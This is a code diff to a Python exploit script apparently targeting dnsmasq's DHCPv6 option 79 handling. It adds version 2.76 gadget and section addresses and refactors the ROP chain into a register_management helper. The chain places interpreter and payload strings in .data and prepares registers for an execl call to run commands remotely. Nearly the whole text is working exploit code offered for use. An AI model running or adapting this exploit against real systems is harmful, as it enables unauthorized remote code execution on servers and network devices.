@@ -90,6 +90,7 @@ TEXT = {
     },
     "amd64": {
         "2.77": 0x0000000000402e00,
+        "2.76": 0x0000000000402d30
     }
 }
 
@@ -105,6 +106,7 @@ DATA = {
     },
     "amd64": {
         "2.77": 0x000000000064a480,
+        "2.76": 0x0000000000648460
     }
 }
 
@@ -120,7 +122,15 @@ EXECL = {
     },
     "amd64": {
         "2.77": 0x0000000000427b30,
+        "2.76": 0x0000000000426a36
     }
+}
+
+
+# Value of EAX in CMP operation
+CMP_EAX = {
+    "2.77": 0x0000000000219ec2,
+    "2.76": 0x0000000000219212
 }
 
 
@@ -157,13 +167,25 @@ ROP = {
             "pop rbp": 0x0000000000402eb6,  # pop rbp ; ret
             "pop rbx": 0x000000000040ae5c,  # pop rbx ; ret
             "mov ecx": 0x000000000040ec0c,  # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
-            "set r8d": 0x0000000000420603,  # mov r8d, 0x7750022 ; ret
-            "add r8d": 0x0000000000428326,  # add r8d, [rcx]; mov [rbp], rax; add rsp, 8; mov rax, rbx; pop rbx; pop rbp; ret
+            "mov r8d": 0x000000000040e223,  # mov r8d, ebx ; jne 0x40e239 ; pop rbx ; pop rbp ; pop r12 ; ret
             "pop rdx": 0x0000000000402fb1,  # pop rdx ; ret
-            "pop rsi": 0x00000000004038eb,  # pop rsi; ret
             "pop rdi": 0x0000000000403439,  # pop rdi; ret
+            "pop rsi": 0x00000000004038eb,  # pop rsi; ret
+            "cmp": 0x0000000000432021,      # cmp eax, 0x219ec2 ; ret
             "mov": 0x00000000004338f9       # mov qword ptr [rsi + 0x70], rdi ; ret
         },
+        "2.76": {
+            "pop rax": 0x0000000000424e54,  # pop rax ; ret
+            "pop rbp": 0x0000000000402de6,  # pop rbp ; ret
+            "pop rbx": 0x000000000040ac9c,  # pop rbx ; ret
+            "mov ecx": 0x000000000040e82c,  # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
+            "mov r8d": 0x000000000040ddd3,  # mov r8d, ebx ; jne 0x40dde9 ; pop rbx ; pop rbp ; pop r12 ; ret
+            "pop rdx": 0x0000000000402ee1,  # pop rdx ; ret
+            "pop rdi": 0x00000000004030b1,  # pop rdi ; ret
+            "pop rsi": 0x000000000040376c,  # pop rsi ; ret
+            "cmp": 0x0000000000430c71,      # cmp eax, 0x219212 ; ret
+            "mov": 0x00000000004324f9       # mov qword ptr [rsi + 0x70], rdi ; ret
+        }
     }
 }
 
@@ -454,7 +476,7 @@ def add_string_in_data(addr_in_data, string):
 
     if architecture == "amd64":
 
-        if dnsmasq_version == "2.77":
+        if v == "2.77" or v == "2.76":
             for x in range(0, len(string), 8):
                 rop_chain += Base.pack64(ROP[a][v]["pop rsi"])     # pop rsi ; ret
                 rop_chain += Base.pack64(addr_in_data + x - 0x70)  # address in .data - 0x70
@@ -463,6 +485,60 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack64(ROP[a][v]["mov"])         # mov qword ptr [rsi + 0x70], rdi ; ret
 
     return rop_chain
+
+
+def register_management(architecture, dnsmasq_version, register_name, register_value):
+    result = ""
+    v = dnsmasq_version
+    r = register_name
+    address = DATA[architecture][dnsmasq_version]
+
+    if architecture == "amd64":
+        if r == "r8d":
+            if v == "2.77" or v == "2.76":
+                # RAX = 0x219ec2
+                # pop rax; ret
+                result += register_management(architecture, dnsmasq_version, "rax", CMP_EAX[dnsmasq_version])
+
+                # RBX = register_value
+                # pop rbx; ret
+                result += register_management(architecture, dnsmasq_version, "rbx", register_value)
+
+                # ZF = 0
+                # cmp eax, 0x219ec2 ; ret
+                result += Base.pack64(ROP[architecture][dnsmasq_version]["cmp"])
+
+                # R8D = register_value
+                # mov r8d, ebx ; jne 0x40e239 ; pop rbx ; pop rbp ; pop r12 ; ret
+                result += Base.pack64(ROP[architecture][dnsmasq_version]["mov r8d"])
+                result += Base.pack64(CRASH[architecture])  # RBX = 0x4141414141414141
+                result += Base.pack64(CRASH[architecture])  # RBP = 0x4141414141414141
+                result += Base.pack64(CRASH[architecture])  # R12 = 0x4141414141414141
+
+        if r == "rax" or r == "rbp" or r == "rbx" or r == "rdx" or r == "rdi" or r == "rsi":
+            if v == "2.77" or v == "2.76":
+                # <register_name> = register_value
+                # pop <register_name>; ret
+                result += Base.pack64(ROP[architecture][dnsmasq_version]["pop " + register_name])
+                result += Base.pack64(register_value)
+
+        if r == "ecx":
+            if v == "2.77" or v == "2.76":
+                # RDI = register_value
+                # pop rdi; ret
+                result += register_management(architecture, dnsmasq_version, "rdi", register_value)
+
+                # RDX = address in .data
+                # pop rdx; ret
+                result += register_management(architecture, dnsmasq_version, "rdx", address)
+
+                # ECX = register_value
+                # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
+                result += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
+
+        return result
+    else:
+        return result
 
 
 def inner_pkg(duid):
@@ -587,76 +663,28 @@ def exploit():
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
 
-        # R8D = 0x7750022
-        # mov r8d, 0x7750022 ; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["set r8d"])
-
-        # RSI + 0x70 = ADDR(path) = 0xFFFFFFFEF88AFFDE
-        # pop rsi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
-        option_79 += Base.pack64(payload_addr - 0x70)
-        # pop rdi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
-        option_79 += Base.pack64(0xFFFFFFFEF88AFFDE)
-        # mov qword ptr [rsi + 0x70], rdi ; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov"])
-
-        # ECX = ADDR(path) = 0xFFFFFFFEF88AFFDE
-        # pop rdi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
-        option_79 += Base.pack64(payload_addr)
-        # pop rdx; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
-        option_79 += Base.pack64(payload_addr + 8)
-        # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
-
-        # EBP = ADDR(path) = 0xFFFFFFFEF88AFFDE
-        # pop rbp ; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rbp"])
-        option_79 += Base.pack64(payload_addr)
-
         # R8D = 0x0000000000000000
-        # add r8d, [rcx]; mov [rbp], rax; add rsp, 8; mov rax, rbx; pop rbx; pop rbp; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["add r8d"])
-        option_79 += Base.pack64(NOP[architecture])  # RBX = 0x9090909090909090
-        option_79 += Base.pack64(NOP[architecture])  # RBP = 0x9090909090909090
-        option_79 += Base.pack64(NOP[architecture])
+        option_79 += register_management(architecture, dnsmasq_version, "r8d", 0x0000000000000000)
 
         # Add strings to .data
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
 
-        # ECX = "payload"
-        # pop rdi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
-        option_79 += Base.pack64(payload_addr)
-        # pop rdx; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
-        option_79 += Base.pack64(payload_addr + 8)
-        # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
+        # ECX = address("payload")
+        option_79 += register_management(architecture, dnsmasq_version, "ecx", payload_addr)
 
-        # ESI = "interpreter"
-        # pop rsi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
-        option_79 += Base.pack64(interpreter_addr)
+        # ESI = address("interpreter")
+        option_79 += register_management(architecture, dnsmasq_version, "rsi", interpreter_addr)
 
-        # EDI = "interpreter"
-        # pop rdi; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
-        option_79 += Base.pack64(interpreter_addr)
+        # EDI = address("interpreter")
+        option_79 += register_management(architecture, dnsmasq_version, "rdi", interpreter_addr)
 
         # RAX = 0x0000000000000000
-        # pop rax; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rax"])
-        option_79 += Base.pack64(0x0000000000000000)
+        option_79 += register_management(architecture, dnsmasq_version, "rax", 0x0000000000000000)
 
         # EDX = "interpreter argument"
-        # pop rdx; ret
-        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
-        option_79 += Base.pack64(interpreter_arg_addr)
+        option_79 += register_management(architecture, dnsmasq_version, "rdx", interpreter_arg_addr)
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
 
